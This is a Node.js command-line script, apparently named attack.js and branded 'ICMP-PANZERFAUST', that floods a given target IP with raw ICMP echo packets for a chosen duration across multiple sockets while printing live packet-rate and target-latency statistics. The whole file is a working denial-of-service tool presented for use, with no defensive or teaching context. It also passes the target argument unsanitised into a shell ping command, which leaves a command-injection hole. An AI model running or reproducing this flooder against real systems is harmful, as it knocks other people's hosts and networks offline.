const raw = require('raw-socket');
const { exec } = require('child_process');

if (process.argv.length < 4 || process.argv.length > 5) {
  console.log('Usage: node attack.js <target_ip> <duration_seconds> [multiplier]');
  process.exit(1);
}

const target = process.argv[2];
const durationMs = parseInt(process.argv[3], 10) * 1000;
const multiplier = process.argv[4] ? Math.max(1, parseInt(process.argv[4], 10)) : 1;

const sockets = [];
const MAX_INFLIGHT_PER_SOCKET = 1000;

function checksum(buf) {
  let sum = 0;
  for (let i = 0; i < buf.length; i += 2) {
    sum += buf.readUInt16BE(i);
  }
  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  }
  return ~sum & 0xFFFF;
}

function createICMPPacket(seq) {
  const buf = Buffer.alloc(8);
  buf.writeUInt8(8, 0);
  buf.writeUInt8(0, 1);
  buf.writeUInt16BE(0, 2);
  buf.writeUInt16BE(process.pid & 0xFFFF, 4);
  buf.writeUInt16BE(seq & 0xFFFF, 6);
  const csum = checksum(buf);
  buf.writeUInt16BE(csum, 2);
  return buf;
}

let sent = 0;
let success = 0;
let failed = 0;
let ppsCounter = 0;
let maxPPS = 0;
let lastLatency = 'N/A';

const endTime = Date.now() + durationMs;

function getPingLatency(ip, callback) {
  const platform = process.platform;
  let cmd = platform === 'win32' ? `ping -n 1 ${ip}` : `ping -c 1 ${ip}`;

  exec(cmd, (error, stdout) => {
    if (error) {
      callback(null);
      return;
    }
    let timeMatch = null;
    if (platform === 'win32') {
      timeMatch = stdout.match(/Average = (\d+)ms/) || stdout.match(/time=(\d+)ms/);
    } else {
      timeMatch = stdout.match(/time=([\d.]+) ms/);
    }
    callback(timeMatch && timeMatch[1] ? timeMatch[1] : null);
  });
}

function clearConsoleLines(n) {
  for (let i = 0; i < n; i++) {
    process.stdout.write('\x1b[1A');
    process.stdout.write('\x1b[2K');
  }
}

function liveLog(final = false) {
  const currentPPS = ppsCounter * 10;
  if (currentPPS > maxPPS) maxPPS = currentPPS;

  if (!final) clearConsoleLines(9);

  process.stdout.write('ICMP-PANZERFAUST\n');
  process.stdout.write('--------------------------------------\n');
  process.stdout.write(`Success: ${success}\n`);
  process.stdout.write(`Failed: ${failed}\n`);
  process.stdout.write(`Max PPS: ${maxPPS.toFixed(2)}\n`);
  process.stdout.write(`Total sent: ${sent}\n`);
  process.stdout.write(`Target latency: ${lastLatency} ms\n`);
  process.stdout.write('--------------------------------------\n');

  ppsCounter = 0;

  if (final) {
    sockets.forEach(s => s.close());
    process.exit(0);
  }
}

function startFlood(socketIndex) {
  let inflight = 0;
  let seq = 0;
  const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
  sockets.push(socket);

  function floodLoop() {
    if (Date.now() >= endTime) {
      liveLog(true);
      return;
    }

    while (inflight < MAX_INFLIGHT_PER_SOCKET && Date.now() < endTime) {
      const packet = createICMPPacket(seq++);
      inflight++;
      socket.send(packet, 0, packet.length, target, (err) => {
        sent++;
        ppsCounter++;
        inflight--;
        if (err) failed++;
        else success++;
      });
    }

    setImmediate(floodLoop);
  }

  floodLoop();
}

function updateLatency() {
  getPingLatency(target, (lat) => {
    lastLatency = lat !== null ? lat : 'N/A';
  });
}

console.log('ICMP-PANZERFAUST');
console.log('--------------------------------------');
console.log(`Target: ${target}`);
console.log(`Duration: ${durationMs / 1000}s`);
console.log(`Multiplier: ${multiplier}x`);
console.log('Starting attack...\n');

liveLog();

setInterval(liveLog, 100);
setInterval(updateLatency, 4000);

for (let i = 0; i < multiplier; i++) {
  startFlood(i);
}
